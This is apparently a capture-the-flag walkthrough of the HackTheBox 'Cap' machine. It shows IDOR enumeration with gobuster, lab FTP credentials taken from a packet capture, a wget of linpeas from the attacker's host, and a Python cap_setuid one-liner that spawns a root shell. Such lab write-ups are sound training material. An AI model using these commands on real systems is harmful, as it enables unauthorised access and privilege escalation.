# Cap walkthrough
<br/>
## Intro
Welcome into the Cap challenge, here is the link to the [room](https://app.hackthebox.com/machines/351) on HackTheBox.
This is an easy machine where we will have to find out a service running on a port, find the vulnerability (OWASP top 10 web-apps) to get a foothold into the system and finally escalate our privileges to get the root's flag.

Whenever you feel ready start the machine and connect via OpenVPN.

<br/>
<br/>

## The Challenge
For this challenge i will be using the [easyscan](https://github.com/Maat-Cyber/Maat-Cyber-World/blob/02407581a43fa0b8cd2a09a4a015b6cf24ca454f/Bash-Scripts/EasyScan.sh) script i created to perform some initial enumeration, finding the open ports and scanning for hidden directories in web-apps, finally checking the presence of any subdomains or virtual hosts.
If you are interested you can check the code in the GitHub repo.

Launching the tool we feed it the `MACHINE_IP` and domain name `cap.htb` and wait a couple of minutes.

We can see that there is an HTTP server hosted and accessible on port 80, while waiting for other scan results let's take a look at he website at:
```
http://cap.htb
```

When we open the website we will land on the Dashboard of the user Nathan, here there is a summary of security events.

In the meantime the tool's basic scan should be completed giving you this report:
```
# NMAP SCAN
21/tcp open  ftp     syn-ack ttl 63 vsftpd 3.0.3
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 63 Gunicorn
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel


# DIRECTORY SCAN
===============================================================
/data                 (Status: 302) [Size: 208] [--> http://10.10.10.245/]
/ip                   (Status: 200) [Size: 17381]
/netstat              (Status: 200) [Size: 58715]
```

Visiting the `/data` directory we can see there is an `id` assigned and presumibly for each of them there is a network capture file we can download.
Downloading and opening our user's capture with Wireshark we do not find inside any leaked info, but what if we are able to see also other users capture files?

To test this IDOR we can try to change the `id` number, for this test let's test the first 100.
Let's create a list with this script:
```bash
#! /bin/bash
for i in {0..101}; 

        do echo $i >> numbers_100.txt;
done
```

Now run the list with *gobuster*:
```bash
gobuster dir -u http://cap.htb/data/ -w /usr/share/wordlists/numbers_100.txt --exclude-length 208
```

And we get this output:
```
/0                    (Status: 200) [Size: 17147]
/2                    (Status: 200) [Size: 17144]
/4                    (Status: 200) [Size: 17144]
/5                    (Status: 200) [Size: 17150]
/7                    (Status: 200) [Size: 17147]
/1                    (Status: 200) [Size: 17144]
/3                    (Status: 200) [Size: 17153]
/10                   (Status: 200) [Size: 17154]
/8                    (Status: 200) [Size: 17144]
/6                    (Status: 200) [Size: 17153]
/15                   (Status: 200) [Size: 17148]
/13                   (Status: 200) [Size: 17154]
/14                   (Status: 200) [Size: 17154]
/12                   (Status: 200) [Size: 17154]
```

This mean we can download packet capture files of 14 other user's which definetly confirms the presence of an IDOR.
Since we have access to this data we can now check some of them to see if  there are any captured credentials in the network traffic.

There are actually 10 of them to download as 4 we can see contains 0 packets.
In the one of `id=0` we can see that an FTP connection has been captured, containing the username ==nathan== and the password ==Buck3tH4TF0RM3!==.
(the data in the network capture is actually hex-encoded, so you will need to use a website like `https://cryptii.com/pipes/hex-decoder`).

During our nmap scan we found and FTP server with an open port, let's now connect to it:
```bash
ftp nathan@cap.htb
```

View the files:
```
ls
```

Download the first flag:
```bash
get user.txt
```

<br/>

### Privilege Escalation
Login via ssh with Nathan's credentials.
Check what we can run as `sudo`:
```bash
sudo -l
```

Unfortunately "*Sorry, user nathan may not run sudo on cap.*"

Let's transfer *linpeas* to the target:
On your machine:
```bash
python3 -m http.server
```

On the target:
```bash
wget http://YOUR_IP:8000/linpeas.sh
```

Make the file executable:
```bash
chmod +x linpeas.sh
```

In the result we can see:
```
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
```

Looks like we might be able to exploit a Linux-Python Capability, specifically the `CAP_SETUID` one, we can leverage that to spawn a shell as root:
```bash
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/sh")'
```

If we check with `whoami` we can see we are now root, let's get the flag:
```bash
cat /root/root.txt
```

<br/>
<br/>

Congratulations, you have successfully exploited the IDOR vulnerability and escalated your privileges to root in this Linux machine.

Catch you in the next CTF 😃 
